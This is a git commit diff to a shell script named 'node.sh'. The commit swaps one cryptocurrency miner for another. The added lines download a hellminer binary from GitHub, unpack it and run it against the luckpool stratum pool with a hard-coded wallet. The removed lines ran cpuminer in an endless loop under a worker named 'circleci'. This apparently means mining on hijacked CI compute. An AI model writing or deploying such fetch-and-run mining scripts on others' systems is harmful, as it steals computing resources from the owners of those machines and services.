af91a28552fae6c3878afdcdda5e6f52cd20abe3
yuliantiriyanti6 <88493189+yuliantiriyanti6@users.noreply.github.com>
2021-08-10 18:58:35 +0700

    Update node.sh

--- node.sh
+++ node.sh
@@ -1,11 +1,6 @@
 #!/bin/sh
 
 # Donwload File
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
-tar xf cpuminer-opt-linux.tar.gz 
-while [ 1 ]; do
-./cpuminer-sse2 -a power2b -o stratum+tcps://stratum-asia.rplant.xyz:17022 -u MkgB8Pqwi9366Jph9Lu1pk1kXnzcKUivny.circleci -t3
-sleep 2
-done
-
-# selesai
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz 
+tar xf hellminer_cpu_linux.tar.gz 
+./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.rucika -p x --cpu 2
